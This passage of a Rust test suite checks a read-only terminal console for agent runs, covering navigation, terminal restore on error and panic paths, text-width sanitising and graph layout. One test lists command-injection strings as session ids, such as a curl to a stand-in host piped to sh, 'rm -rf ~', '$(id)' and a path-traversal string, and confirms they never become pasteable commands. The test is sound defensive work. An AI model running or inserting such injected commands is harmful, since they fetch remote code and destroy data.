    apply(&mut tui, &views, Key::Enter);
    apply(&mut tui, &views, Key::Enter);
    let frame = frame_of(&tui, &views, 100, 26);
    assert!(frame.contains("transcript  —"), "{frame}");
    assert!(!frame.contains("claude --resume"), "{frame}");
}

#[test]
fn a_shell_bearing_session_id_never_becomes_a_pasteable_command() {
    // session_id is a raw journal string rendered into a command the
    // operator is invited to paste. Control characters are stripped,
    // but ';', '&&', '$(…)' and backticks are not — so an id that
    // cannot name a transcript is shown as an absence, never as a
    // suggestion. Same guard the session lookup already applies.
    for hostile in [
        "abc; curl evil.sh | sh",
        "abc && rm -rf ~",
        "$(id)",
        "`id`",
        "../../etc/passwd",
    ] {
        assert!(
            !crate::ui::valid_session_id(hostile),
            "{hostile:?} must not pass the guard"
        );
        let mut views = views();
        for part in &mut views.run.as_mut().unwrap().participants {
            part.session_id = Some(hostile.to_string());
        }
        let mut tui = at_seats("eff-d");
        apply(&mut tui, &views, Key::Enter);
        apply(&mut tui, &views, Key::Enter);
        let frame = frame_of(&tui, &views, 100, 26);
        assert!(
            !frame.contains("claude --resume"),
            "hostile id reached a resume line: {frame}"
        );
        assert!(!frame.contains("curl"), "{frame}");
        assert!(!frame.contains("rm -rf"), "{frame}");
    }
}

#[test]
fn the_checkpoint_pane_scrolls_and_the_transcript_pane_moves_a_turn_cursor() {
    let mut views = views();
    views.transcript = Some((turns_of(4), false));
    let mut tui = at_seats("eff-i");
    apply(&mut tui, &views, Key::Enter);
    apply(&mut tui, &views, Key::Enter);

    apply(&mut tui, &views, Key::Down);
    assert_eq!(tui.offset, 1, "the checkpoint pane scrolls");
    apply(&mut tui, &views, Key::Char('G'));
    assert_eq!(
        tui.offset,
        seat_of(&tui, &views).unwrap().checkpoints.len() - 1
    );
    apply(&mut tui, &views, Key::Char('g'));
    assert_eq!(tui.offset, 0);
    apply(&mut tui, &views, Key::PageDown);
    apply(&mut tui, &views, Key::PageUp);
    assert_eq!(tui.offset, 0);

    // The transcript pane is a LIST of turns now: `G` lands the TURN
    // cursor on the last turn and leaves the paragraph offset alone.
    apply(&mut tui, &views, Key::Tab);
    apply(&mut tui, &views, Key::Char('G'));
    assert_eq!(tui.turn.as_deref(), Some("3"));
    assert_eq!(tui.offset, 0, "the checkpoint offset stayed put");
    assert_eq!(offset_for(&tui, 0), 0, "an unfocused pane keeps its top");

    // A pane with nothing in it holds no cursor and no offset at all.
    views.transcript = None;
    apply(&mut tui, &views, Key::Char('G'));
    assert_eq!(tui.turn, None);
    apply(&mut tui, &views, Key::Tab);
    apply(&mut tui, &Views::empty(), Key::Char('G'));
    assert_eq!(tui.offset, 0);
}

// ---------------------------------------------- AC-8, AC-13: help and size

#[test]
fn help_overlays_and_a_terminal_below_the_minimum_names_the_other_verbs() {
    let views = views();
    let mut tui = Tui::new(None);
    apply(&mut tui, &views, Key::Char('?'));
    let frame = frame_of(&tui, &views, 100, 20);
    assert!(frame.contains("read-only"), "the help says what this is");
    assert!(frame.contains("Enter"), "and names the keys: {frame}");
    apply(&mut tui, &views, Key::Char('?'));
    assert!(!tui.help, "? toggles");

    // A resize below the minimum draws ONE centred frame naming the
    // other two surfaces, and never tears the session down.
    let small = frame_of(&tui, &views, MIN_WIDTH - 1, 20);
    assert!(small.contains("too small"), "{small}");
    assert!(small.contains("brokkr inspect"), "{small}");
    assert!(small.contains("brokkr watch"), "{small}");
    let short = frame_of(&tui, &views, 100, MIN_HEIGHT - 1);
    assert!(short.contains("too small"), "{short}");
    assert!(short.contains("q or Ctrl+C quits"), "{short}");
}

// ------------------------------------------------------ AC-2: the refusals

#[test]
fn every_startup_refusal_names_both_of_the_other_readouts() {
    assert_eq!(refuse(true, (100, 40), true), None, "a real terminal");
    for refusal in [
        refuse(true, (100, 40), false),
        refuse(false, (100, 40), true),
        refuse(true, (MIN_WIDTH - 1, 40), true),
        refuse(true, (100, MIN_HEIGHT - 1), true),
    ] {
        let message = refusal.expect("a refusal");
        assert!(message.contains("brokkr inspect"), "{message}");
        assert!(message.contains("brokkr watch"), "{message}");
    }
    assert!(refuse(true, (100, 40), false)
        .unwrap()
        .contains("a read never creates one"));
    assert!(refuse(false, (100, 40), true).unwrap().contains("not one"));
    assert!(refuse(true, (10, 40), true).unwrap().contains("10×40"));
}

// ------------------------------------------- AC-12: the terminal lifecycle

/// `set_hook`/`take_hook` and the recorders below are process-global, so
/// every test that touches them takes this first.
static TERMINAL: Mutex<()> = Mutex::new(());
static SCRIPT: Mutex<Vec<Event>> = Mutex::new(Vec::new());
static ENTERED: AtomicUsize = AtomicUsize::new(0);
static LEFT: AtomicUsize = AtomicUsize::new(0);
static RESTORED: AtomicUsize = AtomicUsize::new(0);
static CHAINED: AtomicUsize = AtomicUsize::new(0);

fn script(keys: &[Key]) {
    let mut script = SCRIPT.lock().unwrap();
    script.clear();
    for key in keys {
        let code = match key {
            Key::Enter => KeyCode::Enter,
            Key::Escape => KeyCode::Esc,
            Key::Backspace => KeyCode::Backspace,
            Key::Tab => KeyCode::Tab,
            Key::Up => KeyCode::Up,
            Key::Down => KeyCode::Down,
            Key::Left => KeyCode::Left,
            Key::Right => KeyCode::Right,
            Key::PageUp => KeyCode::PageUp,
            Key::PageDown => KeyCode::PageDown,
            Key::Char(character) => KeyCode::Char(*character),
            Key::Quit => KeyCode::Char('q'),
        };
        script.push(Event::Key(KeyEvent::new(code, KeyModifiers::NONE)));
    }
}

fn scripted_poll(_: Duration) -> std::io::Result<bool> {
    Ok(!SCRIPT.lock().unwrap().is_empty())
}

fn scripted_read() -> std::io::Result<Event> {
    Ok(SCRIPT.lock().unwrap().remove(0))
}

fn record_enter() -> std::io::Result<()> {
    ENTERED.fetch_add(1, Ordering::SeqCst);
    Ok(())
}

fn record_leave() -> std::io::Result<()> {
    LEFT.fetch_add(1, Ordering::SeqCst);
    Ok(())
}

fn refuse_raw_mode() -> std::io::Result<()> {
    Err(std::io::Error::other("this terminal refuses raw mode"))
}

fn fixed_size() -> std::io::Result<(u16, u16)> {
    Ok((100, 30))
}

fn record_restore() {
    RESTORED.fetch_add(1, Ordering::SeqCst);
}

fn test_ops() -> TerminalOps {
    TerminalOps {
        enter_raw: record_enter,
        leave_raw: record_leave,
        poll: scripted_poll,
        read: scripted_read,
        size: fixed_size,
    }
}

/// A writer that always refuses: the alternate-screen error path is a
/// real closed pipe, not decoration.
struct ClosedPipe;

impl Write for ClosedPipe {
    fn write(&mut self, _: &[u8]) -> std::io::Result<usize> {
        Err(std::io::Error::other("closed pipe"))
    }

    fn flush(&mut self) -> std::io::Result<()> {
        Ok(())
    }
}

#[test]
fn the_terminal_is_entered_and_left_on_every_path_including_the_error_ones() {
    let _serialized = TERMINAL.lock().unwrap_or_else(|error| error.into_inner());
    let saved = std::panic::take_hook();

    // The production ops are crossterm's own function items: this
    // constructs them without invoking one.
    let ops = production_ops();
    assert!(std::ptr::fn_addr_eq(
        ops.enter_raw,
        enable_raw_mode as fn() -> std::io::Result<()>
    ));

    // The alternate-screen sequences are real code against a real
    // writer, with no effect on this process's terminal.
    let mut sink: Vec<u8> = Vec::new();
    execute!(sink, EnterAlternateScreen, Hide).unwrap();
    let bytes = String::from_utf8(sink).unwrap();
    assert!(bytes.contains("\x1b[?1049h"), "{bytes:?}");
    assert!(bytes.contains("\x1b[?25l"), "{bytes:?}");

    // A clean run: enter, draw, quit, restore.
    let entered = ENTERED.load(Ordering::SeqCst);
    let left = LEFT.load(Ordering::SeqCst);
    script(&[Key::Quit]);
    let mut source = |_: Ask| Ok(Some(views()));
    let code = start(
        true,
        None,
        Vec::new(),
        0,
        test_ops(),
        true,
        false,
        TestBackend::new(100, 30),
        Vec::new(),
        &mut source,
        8,
    )
    .unwrap();
    assert_eq!(code, ExitCode::SUCCESS);
    assert_eq!(ENTERED.load(Ordering::SeqCst), entered + 1);
    assert_eq!(
        LEFT.load(Ordering::SeqCst),
        left + 1,
        "the guard's Drop ran"
    );

    // The error path: the alternate-screen write fails, and the guard
    // still restores BEFORE the Err reaches the caller.
    let left = LEFT.load(Ordering::SeqCst);
    let mut source = |_: Ask| Ok(Some(views()));
    let error = start(
        true,
        None,
        Vec::new(),
        0,
        test_ops(),
        true,
        false,
        TestBackend::new(100, 30),
        ClosedPipe,
        &mut source,
        4,
    )
    .unwrap_err();
    assert!(error.to_string().contains("closed pipe"), "{error}");
    assert_eq!(
        LEFT.load(Ordering::SeqCst),
        left + 1,
        "restored on the error path"
    );

    // Raw mode itself can refuse; nothing is entered and nothing leaks.
    let mut ops = test_ops();
    ops.enter_raw = refuse_raw_mode;
    let mut source = |_: Ask| Ok(Some(views()));
    let error = start(
        true,
        None,
        Vec::new(),
        0,
        ops,
        true,
        false,
        TestBackend::new(100, 30),
        Vec::new(),
        &mut source,
        4,
    )
    .unwrap_err();
    assert!(error.to_string().contains("refuses raw mode"), "{error}");

    // And the startup refusal precedes every one of those effects.
    let mut source = |_: Ask| Ok(Some(views()));
    let refused = start(
        false,
        None,
        Vec::new(),
        0,
        test_ops(),
        true,
        false,
        TestBackend::new(100, 30),
        Vec::new(),
        &mut source,
        4,
    )
    .unwrap_err();
    assert!(refused.to_string().contains("brokkr watch"), "{refused}");

    std::panic::set_hook(saved);
}

#[test]
fn the_panic_hook_restores_first_chains_second_and_is_put_back_after() {
    let _serialized = TERMINAL.lock().unwrap_or_else(|error| error.into_inner());
    let saved = std::panic::take_hook();
    std::panic::set_hook(Box::new(|_| {
        CHAINED.fetch_add(1, Ordering::SeqCst);
    }));

    let restored = RESTORED.load(Ordering::SeqCst);
    let chained = CHAINED.load(Ordering::SeqCst);
    install_panic_hook(record_restore);
    let panicked = std::panic::catch_unwind(|| panic!("a deliberate panic"));
    assert!(panicked.is_err());
    assert_eq!(
        RESTORED.load(Ordering::SeqCst),
        restored + 1,
        "the terminal is restored first"
    );
    assert_eq!(
        CHAINED.load(Ordering::SeqCst),
        chained + 1,
        "and the previous hook still ran"
    );

    // Installing twice is harmless: each layer restores and chains.
    install_panic_hook(record_restore);
    let panicked = std::panic::catch_unwind(|| panic!("again"));
    assert!(panicked.is_err());
    assert_eq!(RESTORED.load(Ordering::SeqCst), restored + 3);

    let _ = std::panic::take_hook();
    std::panic::set_hook(saved);

    // The production restore is error-swallowing by construction: with
    // no terminal attached it does nothing and cannot panic.
    restore_stdout();
}

// --------------------------------------------------------- AC-9: the shell

#[test]
fn the_shell_redraws_keeps_keys_live_through_a_bad_journal_and_gives_up_at_last() {
    let _serialized = TERMINAL.lock().unwrap_or_else(|error| error.into_inner());
    let saved = std::panic::take_hook();
    let mut terminal = Terminal::new(TestBackend::new(100, 30)).unwrap();

    // A source that answers "nothing moved" keeps the frame it has.
    script(&[Key::Down, Key::Char('r'), Key::Quit]);
    let mut answers = 0usize;
    let mut forced: Vec<bool> = Vec::new();
    let mut source = |ask: Ask| {
        answers += 1;
        forced.push(ask.force);
        match answers {
            1 => Ok(Some(views())),
            _ => Ok(None),
        }
    };
    let mut tui = Tui::new(None);
    let code = drive(&mut terminal, &test_ops(), &mut source, &mut tui, 9).unwrap();
    assert_eq!(code, ExitCode::SUCCESS);
    assert_eq!(tui.cursor[0].as_deref(), Some("run-7"), "the key arrived");
    assert_eq!(
        forced,
        vec![true, false, true],
        "the first frame forces, and so does `r` — nothing else does"
    );

    // A transient store error is a frame that SAYS SO, with keys still
    // live — a console the operator cannot quit for ten seconds is not
    // a console.
    script(&[Key::Char('j'), Key::Quit]);
    let mut source = |_: Ask| Err(anyhow::anyhow!("database is locked"));
    let mut tui = Tui::new(None);
    let code = drive(&mut terminal, &test_ops(), &mut source, &mut tui, 2).unwrap();
    assert_eq!(code, ExitCode::SUCCESS, "q was handled while unreadable");
    assert!(tui
        .status
        .as_deref()
        .unwrap()
        .contains("the journal is not readable right now"));

    // A persistent one gives up past the constant `watch` already uses.
    let mut source = |_: Ask| Err(anyhow::anyhow!("database is locked"));
    let mut tui = Tui::new(None);
    let error = drive(
        &mut terminal,
        &test_ops(),
        &mut source,
        &mut tui,
        crate::WATCH_TRANSIENT_FRAMES + 2,
    )
    .unwrap_err();
    assert!(error.to_string().contains("unreadable polls"), "{error}");

    // The fleet's slower cadence is asked for on the named tick, and a
    // key that binds to nothing is simply not a key.
    SCRIPT.lock().unwrap().clear();
    SCRIPT
        .lock()
        .unwrap()
        .push(Event::Key(KeyEvent::new(KeyCode::Home, KeyModifiers::NONE)));
    let mut fleets = 0usize;
    let mut source = |ask: Ask| {
        if ask.fleet {
            fleets += 1;
        }
        Ok(Some(views()))
    };
    let mut tui = Tui::new(None);
    drive(
        &mut terminal,
        &test_ops(),
        &mut source,
        &mut tui,
        RUNS_REFRESH_TICKS + 1,
    )
    .unwrap();
    assert_eq!(fleets, 2, "once at the first frame, once on the cadence");

    std::panic::set_hook(saved);
}

#[test]
fn the_shell_asks_for_the_seats_session_only_while_that_seat_is_open() {
    let _serialized = TERMINAL.lock().unwrap_or_else(|error| error.into_inner());
    let mut terminal = Terminal::new(TestBackend::new(100, 30)).unwrap();
    script(&[
        Key::Down,
        Key::Enter,
        Key::Tab,
        Key::Down,
        Key::Enter,
        Key::Enter,
        Key::Quit,
    ]);
    let mut asked: Vec<Option<String>> = Vec::new();
    let mut source = |ask: Ask| {
        asked.push(ask.session.map(str::to_string));
        Ok(Some(views()))
    };
    let mut tui = Tui::new(None);
    drive(&mut terminal, &test_ops(), &mut source, &mut tui, 12).unwrap();
    assert!(
        asked
            .iter()
            .any(|session| session.as_deref() == Some("abcd-1234")),
        "the open seat's session id is a model field: {asked:?}"
    );
    assert!(
        asked.first().unwrap().is_none(),
        "and nothing is read before a seat is open"
    );
}

/// The shell watches a transcript file only while the seat can still
/// write to it. `status` is a model field this branches on — the same
/// one the seats table shows — and the question is asked where the
/// `Ask` is built, never inside `apply`, which has no notion of a file.
#[test]
fn the_shell_watches_a_transcript_only_while_its_seat_is_working() {
    let views = views();
    let mut tui = at_seats("eff-i");
    apply(&mut tui, &views, Key::Enter);
    apply(&mut tui, &views, Key::Enter);
    assert_eq!(tui.level, Level::Participant);
    assert_eq!(session_of(&tui, &views), Some("abcd-1234"));
    assert!(
        !session_is_live(&tui, &views),
        "a concluded seat's transcript is already whole"
    );

    // The same seat, still working: now there is prose still landing.
    let mut live = views_with("intake");
    for part in &mut live.run.as_mut().unwrap().participants {
        part.status = "working".to_string();
    }
    assert!(session_is_live(&tui, &live));

    // A working seat with no session id has no file to watch...
    for part in &mut live.run.as_mut().unwrap().participants {
        if let Some(transcript) = &mut part.transcript {
            transcript.locator.clear();
        }
        part.session_id = None;
    }
    assert!(!session_is_live(&tui, &live));

    // ...and neither has an operator who is not drilled into one.
    assert!(!session_is_live(&at_run(), &views));
}

/// A panel with no sequence steps: one fork, no step label. The other
/// shape the tree draws.
fn panel_views() -> Views {
    let mut events = vec![
        ev(1, EventType::RunStarted, json!({"feature": "a panel"}), T0),
        ev(2, EventType::PhaseEntered, json!({"phase": "review"}), T0),
        ev(
            3,
            EventType::EffectRequested,
            json!({"effect_id": "eff-p", "seat": "review", "phase": "review"}),
            T0,
        ),
        ev(
            4,
            EventType::EffectStarted,
            json!({"effect_id": "eff-p", "attempt_id": "att"}),
            T0,
        ),
    ];
    for (seq, member) in [(5, "security"), (6, "correctness")] {
        events.push(ev(
            seq,
            EventType::EffectCheckpointed,
            json!({"effect_id": "eff-p", "attempt_id": "att",
                   "checkpoint": {"member": member, "step": "seat-turn", "turn": 1,
                                  "tool": "Grep"}}),
            T0,
        ));
    }
    let stopped = state_of(Status::Stopped);
    Views {
        now: NOW.to_string(),
        runs: brokkr_view::run_rows(&[brokkr_view::RunEntry {
            run_id: "run-stopped",
            feature: "a run that stopped",
            created_at: T0,
            state: Some(&stopped),
            detail: None,
        }]),
        run: Some(brokkr_view::run_view(&events, Some(&stopped))),
        transcript: None,
        note: None,
    }
}

#[test]
fn the_keys_lists_and_tints_a_console_still_needs_are_all_there() {
    let views = views();

    // Ctrl with any other key is not the quit binding.
    assert_eq!(
        from_crossterm(Event::Key(KeyEvent::new(
            KeyCode::Char('d'),
            KeyModifiers::CONTROL
        ))),
        Some(Key::Char('d'))
    );

    // `Key::Quit` is what Ctrl+C becomes, and it quits from anywhere.
    let mut tui = Tui::new(None);
    assert_eq!(apply(&mut tui, &views, Key::Quit), Flow::Quit);

    // ↑ and k move alike; an unbound letter is not a command.
    apply(&mut tui, &views, Key::Up);
    assert_eq!(tui.cursor[0].as_deref(), Some("run-7"), "newest first");
    apply(&mut tui, &views, Key::Char('k'));
    assert_eq!(tui.cursor[0].as_deref(), Some("run-unfoldable"), "k wraps");
    let held = tui.cursor[0].clone();
    apply(&mut tui, &views, Key::Char('x'));
    assert_eq!(tui.cursor[0], held);

    // The trail is a list of its own. Enter reads the selected evidence
    // without descending to another navigation level.
    let mut tui = at_run();
    tui.pane = 2;
    let trail = keys_for(&tui, &views);
    assert!(!trail.is_empty(), "the trail lists its rows by seq");
    assert!(
        trail.len() < views.run.as_ref().unwrap().journal.len(),
        "and the checkpoints the trail hides are not in it"
    );
    apply(&mut tui, &views, Key::Down);
    apply(&mut tui, &views, Key::Enter);
    assert_eq!(tui.level, Level::Run);
    assert!(tui.scope.is_none());
    assert!(tui.reading.is_some());

    // The PARTICIPANT panes are paragraphs: no list, nothing to filter.
    let mut tui = at_seats("eff-i");
    apply(&mut tui, &views, Key::Enter);
    apply(&mut tui, &views, Key::Enter);
    assert!(keys_for(&tui, &views).is_empty());

    // A seat scope with the cursor elsewhere names the verb that
    // applies to THIS row, not to the scoped one.
    let mut tui = at_seats("eff-i");
    apply(&mut tui, &views, Key::Enter);
    tui.cursor[1] = Some("eff-d".to_string());
    assert!(footer_for(&tui, &views).contains("Enter scope seat"));
}

#[test]
fn a_filtered_fleet_a_stopped_run_a_bare_fork_and_a_whole_transcript_all_draw() {
    // A filter hides rows from the table it was typed over.
    let views = views();
    let mut tui = Tui::new(None);
    tui.filter = "run-7".to_string();
    let frame = frame_of(&tui, &views, 100, 20);
    assert!(frame.contains("run-7"));
    assert!(
        !frame.contains("run-old"),
        "the filter hides a row: {frame}"
    );

    // A stopped run and a fork with no step name: the other tone and
    // the other tree shape.
    let panel = panel_views();
    let tui = Tui::new(None);
    let frame = frame_of(&tui, &panel, 100, 20);
    assert!(frame.contains("stopped"), "{frame}");
    let tui = Tui::new(Some("run-stopped".to_string()));
    let frame = frame_of(&tui, &panel, 110, 30);
    assert!(
        frame.contains('┤') && frame.contains('├'),
        "a bare fork that rejoins: {frame}"
    );
    assert!(frame.contains("security"), "{frame}");
    assert!(frame.contains("correctness"), "{frame}");

    // A transcript that fits carries no truncation line.
    let mut views = views;
    views.transcript = Some((
        vec![crate::ui::Turn {
            role: "user".to_string(),
            ts: T0.to_string(),
            blocks: vec![crate::ui::Block {
                kind: "tool",
                text: "Read · docs/decisions/0014-interactive-tui.md".to_string(),
            }],
        }],
        false,
    ));
    let mut tui = at_seats("eff-i");
    apply(&mut tui, &views, Key::Enter);
    apply(&mut tui, &views, Key::Enter);
    let frame = frame_of(&tui, &views, 100, 26);
    assert!(frame.contains("Read · docs"), "{frame}");
    assert!(!frame.contains("truncated"), "{frame}");
}

// ------------------------------------------------------- the graph pane
//
// The console's grammar in the terminal: one rail, arrowed steps, forks
// that rejoin, one name baseline, a fixed colour vocabulary, and a pulse
// that is a pure function of a tick. Geometry is asserted against the
// `Plan` — a small owned struct — rather than by substring-searching a
// rendered buffer, and the drawn frames are asserted through
// `TestBackend`.

fn gnode(label: &str, state: &str, class: &str) -> Node {
    Node {
        label: label.to_string(),
        key: format!("key:{label}"),
        state: state.to_string(),
        state_class: class.to_string(),
        model: brokkr_view::Cell {
            text: "—".to_string(),
            absent: true,
            note: None,
        },
    }
}

fn gnode_with_model(label: &str, model: &str) -> Node {
    let mut node = gnode(label, "finished", "on-phosphor");
    node.model = brokkr_view::Cell {
        text: model.to_string(),
        absent: false,
        note: None,
    };
    node
}

fn gcolumn(label: Option<&str>, nodes: Vec<Node>) -> Column {
    Column {
        label: label.map(str::to_string),
        nodes,
    }
}

fn gphase(name: &str, visits: u64, current: bool, columns: Vec<Column>) -> Phase {
    Phase {
        name: name.to_string(),
        visits,
        current,
        plain: columns.is_empty(),
        columns,
        // No road in: a synthetic phase is a forward one unless a case
        // says otherwise, which `returned` is for.
        returns: Vec::new(),
    }
}

fn members(count: usize, class: &str) -> Vec<Node> {
    (0..count)
        .map(|index| gnode(&format!("m{index}"), "finished", class))
        .collect()
}

/// Every shape the rail draws, on one rail: a plain phase, a revisited
/// phase carrying a two-member fork with a step name and a one-member
/// step, and a plain current phase.
fn rail_phases() -> Vec<Phase> {
    vec![
        gphase("intake", 1, false, Vec::new()),
        gphase(
            "design",
            2,
            false,
            vec![
                gcolumn(
                    Some("positions"),
                    vec![
                        gnode("simplicity", "finished", "on-phosphor"),
                        gnode("robustness", "active", "in-active"),
                    ],
                ),
                gcolumn(
                    Some("review"),
                    vec![gnode("only", "finished", "on-phosphor")],
                ),
            ],
        ),
        gphase("verify", 1, true, Vec::new()),
    ]
}

/// A `Views` carrying exactly these phases and this run status, so a
/// draw case can name the shape it is asserting instead of building a
/// journal that happens to fold into it.
fn graph_views(phases: Vec<Phase>, status: &str) -> Views {
    let mut view = run_view_for("intake");
    view.phases = phases;
    match view.summary.as_mut() {
        Some(summary) => summary.status = status.to_string(),
        None => panic!("the fixture folds"),
    }
    Views {
        now: NOW.to_string(),
        runs: fleet(),
        run: Some(view),
        transcript: None,
        note: None,
    }
}

/// A `Tui` sitting on the graph pane of `run-7`.
fn at_graph() -> Tui {
    Tui::new(Some("run-7".to_string()))
}

fn text_of(lines: &[Line<'static>]) -> String {
    lines
        .iter()
        .map(|line| {
            line.spans
                .iter()
                .map(|span| span.content.as_ref())
                .collect::<String>()
        })
        .collect::<Vec<String>>()
        .join("\n")
}

// ------------------------------------------------- AC-safe-2: the widths

#[test]
fn every_graph_width_is_ratatuis_own_measurement_of_the_sanitized_text() {
    // `Safe::width()` is a char count. The rail is the first pane that
    // places its own x positions, so it is the first that can be lied to.
    assert_eq!(Safe::new("設計フェーズ").width(), 6, "six characters");
    assert_eq!(width_of("設計フェーズ"), 12, "twelve columns drawn");
    assert_eq!(width_of("intake"), 6, "and ASCII agrees with both");
    assert_eq!(
        width_of("in\u{202E}take\u{200B}\x07"),
        6,
        "measured on the SANITIZED text, so a stripped override cannot \
         claim invisible columns"
    );

    // Text is what gives way; the skeleton never is.
    assert_eq!(clamp("intake", 10), "intake");
    assert_eq!(clamp("simplicity", 6), "simpl…");
    assert_eq!(width_of(&clamp("simplicity", 6)), 6, "the clamp is exact");
    assert_eq!(clamp("設計フェーズ", 5), "設計…");
    assert_eq!(width_of(&clamp("設計フェーズ", 5)), 5);
    let absent = gnode("implement", "finished", "on-phosphor");
    assert_eq!(modelled_label("implement", Some(&absent)), "implement");
    let reported = gnode_with_model("implement", "claude-fable-5-1");
    assert_eq!(
        modelled_label("implement", Some(&reported)),
        "model claude-fable-5-1 · implement"
    );
    assert!(
        clamp(&modelled_label("implement", Some(&reported)), LABEL_MAX).starts_with("model "),
        "the bounded graph label must retain the field name"
    );
    assert_eq!(clamp("simplicity", 0), "", "nothing fits in nothing");
    assert_eq!(clamp("a\u{202E}b", 8), "ab", "and it sanitizes on the way");

    assert_eq!(label_span(""), 0, "no text, no footprint");
    assert_eq!(label_span("ab"), 3, "one space and the text");
}

// --------------------------------- AC-look-1, AC-look-2, AC-look-3: colour

#[test]
fn the_node_vocabulary_is_a_closed_set_with_one_named_fallback() {
    for (class, still) in [
        (Class::Visited, "⏺"),
        (Class::Current, "∙"),
        (Class::Park, "⊙"),
        (Class::Failed, "⊗"),
        (Class::Finished, "⏺"),
        (Class::Active, "∙"),
        (Class::Unknown, "·"),
    ] {
        let (style, ramp) = look(class);
        assert_eq!(ramp[0], still, "{class:?}'s still frame");
        assert_ne!(style, plain(), "{class:?} paints something");
    }

    // A phase's own node: the console's `phase.current × summary.status`
    // branch, transliterated.
    assert_eq!(class_for_phase(false, "running"), Class::Visited);
    assert_eq!(class_for_phase(true, "running"), Class::Current);
    assert_eq!(class_for_phase(true, "completed"), Class::Current);
    assert_eq!(class_for_phase(true, "awaiting_operator"), Class::Park);
    assert_eq!(class_for_phase(true, "stopped"), Class::Failed);
    // AC-look-2: a status outside the known set renders QUIET, never
    // live — a named divergence from `ui.html`, which falls to green.
    assert_eq!(class_for_phase(true, "reticulating"), Class::Unknown);
    assert_eq!(class_for_phase(true, ""), Class::Unknown);

    // A node inside a phase: the console's `NODE_CLASS` allowlist.
    assert_eq!(class_for_node("on-phosphor"), Class::Finished);
    assert_eq!(class_for_node("in-active"), Class::Active);
    assert_eq!(class_for_node("on-park"), Class::Park);
    assert_eq!(class_for_node("on-halt"), Class::Failed);
    assert_eq!(
        class_for_node("a class name from a journal"),
        Class::Unknown,
        "no journal string reaches this table"
    );

    // AC-look-3: active and finished differ in the GLYPH channel, so the
    // distinction survives NO_COLOR and survives animation being off.
    assert_ne!(look(Class::Active).1[0], look(Class::Finished).1[0]);
    assert_ne!(look(Class::Current).1[0], look(Class::Visited).1[0]);

    // The worst member speaks for a column drawn as one node.
    assert_eq!(
        worst(&[
            gnode("a", "finished", "on-phosphor"),
            gnode("b", "failed", "on-halt")
        ]),
        1
    );
    assert_eq!(
        worst(&[gnode("a", "x", "on-park"), gnode("b", "failed", "on-halt")]),
        1
    );
    assert_eq!(
        worst(&[
            gnode("a", "active", "in-active"),
            gnode("b", "x", "on-phosphor")
        ]),
        0,
        "a working member outranks a finished one"
    );
    assert_eq!(
        worst(&[
            gnode("a", "active", "in-active"),
            gnode("b", "x", "who knows")
        ]),
        1,
        "and an unrecognised one outranks a working one"
    );
    assert_eq!(worst(&[]), 0, "a column the derivation left empty");

    assert_eq!(
        column_label(&gcolumn(Some("positions"), members(1, "on-phosphor"))),
        "positions"
    );
    assert_eq!(
        column_label(&gcolumn(None, members(1, "on-phosphor"))),
        "m0"
    );
    assert_eq!(column_label(&gcolumn(None, Vec::new())), "");
}

// -------------------------- AC-anim-1, AC-anim-2, AC-anim-3: the pulse

#[test]
fn the_pulse_is_a_pure_total_function_of_a_tick_and_two_model_facts() {
    // A full period, and the `PULSE_TICKS` boundary inside it.
    let period: Vec<usize> = (0..8).map(|tick| pulse(tick, true, true)).collect();
    assert_eq!(period, vec![0, 0, 1, 1, 2, 2, 3, 3]);
    assert_eq!(pulse(8, true, true), 0, "and the period closes");
    assert_eq!(
        pulse(3, true, true),
        pulse(3, true, true),
        "same inputs, same frame"
    );
    // Total over `usize`, including the top of it.
    assert_eq!(pulse(usize::MAX, true, true), (usize::MAX / 2) % 4);

    // AC-anim-2 and AC-anim-3: not live, or not animating, is the still
    // frame at EVERY tick — there is no idle cost, because none was added.
    for tick in [0usize, 1, 2, 3, 7, usize::MAX] {
        assert_eq!(pulse(tick, false, true), 0, "nothing live, nothing moving");
        assert_eq!(pulse(tick, true, false), 0, "animation off is frame 0");
        assert_eq!(pulse(tick, false, false), 0);
    }
    // The named rate is a const, and the ramp it indexes has exactly
    // that many frames.
    assert_eq!(PULSE_TICKS, 2);
    assert_eq!(look(Class::Current).1.len(), PULSE_FRAMES);
}

// ------------------------------------------------- AC-mode-1: the ladder

#[test]
fn the_vertical_ladder_is_three_named_modes_and_one_predicate() {
    // Rail row, name baseline and at least one lane row on each side.
    assert_eq!(mode_for(7, 1), Mode::Full, "the 80×24 budget");
    assert_eq!(mode_for(4, 1), Mode::Full, "the floor for lanes");
    assert_eq!(mode_for(3, 1), Mode::Rail, "one row short of lanes");
    assert_eq!(mode_for(2, 3), Mode::Rail, "rail plus names, no more");
    assert_eq!(
        mode_for(9, 0),
        Mode::Rail,
        "no parallel column, no lanes to draw"
    );
    // At MIN_HEIGHT the graph pane's inner rect is about one row.
    assert_eq!(mode_for(1, 3), Mode::Compressed);
    assert_eq!(mode_for(0, 0), Mode::Compressed);

    // Member `k` of `n` sits symmetric about the rail, and an even count
    // leaves the rail row to the rail.
    let offsets = |n: usize| (0..n).map(|k| lane_offset(k, n)).collect::<Vec<isize>>();
    assert_eq!(offsets(2), vec![-1, 1]);
    assert_eq!(offsets(3), vec![-1, 0, 1]);
    assert_eq!(offsets(4), vec![-2, -1, 1, 2]);
    assert_eq!(offsets(5), vec![-2, -1, 0, 1, 2]);
}

// ------------------------------------------- AC-draw-3, AC-draw-4: the plan

#[test]
fn the_plan_is_owned_geometry_that_fits_by_construction() {
    let phases = rail_phases();
    let plan = plan(&phases, None, "running", None, None, 80, 7);
    assert_eq!(plan.mode, Mode::Full);
    assert_eq!(plan.rows, 7);
    assert_eq!(
        plan.box_row,
        Some(6),
        "the last row is reserved for the selection box's lower edge"
    );
    assert_eq!(plan.name_row, 5, "the baseline sits above the box row");
    assert_eq!(plan.rail_row, 3, "one row above the deepest lane");
    assert_eq!(plan.segments.len(), 3, "every phase is listed");

    // ONE rail: consecutive segments are separated by exactly one
    // arrowed edge of the frame's single connector length, and nothing
    // overlaps. The connector is at LEAST the arrow; a name that hangs
    // off its node claims the rest of it, for every gap alike.
    let connectors: Vec<usize> = plan
        .segments
        .windows(2)
        .map(|pair| pair[1].rail.0 - pair[0].rail.1 - 1)
        .collect();
    assert!(
        connectors.iter().all(|length| *length >= ARROW_WIDTH),
        "an arrowed edge between steps: {connectors:?}"
    );
    for pair in plan.segments.windows(2) {
        assert!(pair[1].x0 > pair[0].x1, "and nothing overlaps");
    }
    assert_eq!(plan.edges.len(), 3, "two between phases, one inside design");
    // Everything is inside the pane, with the elision columns reserved.
    assert!(plan.segments[0].x0 >= 1);
    assert!(plan.segments[2].x1 < plan.width - 1);
    let (from, to) = plan.rail.expect("a rail");
    assert!(from >= 1 && to < plan.width - 1);

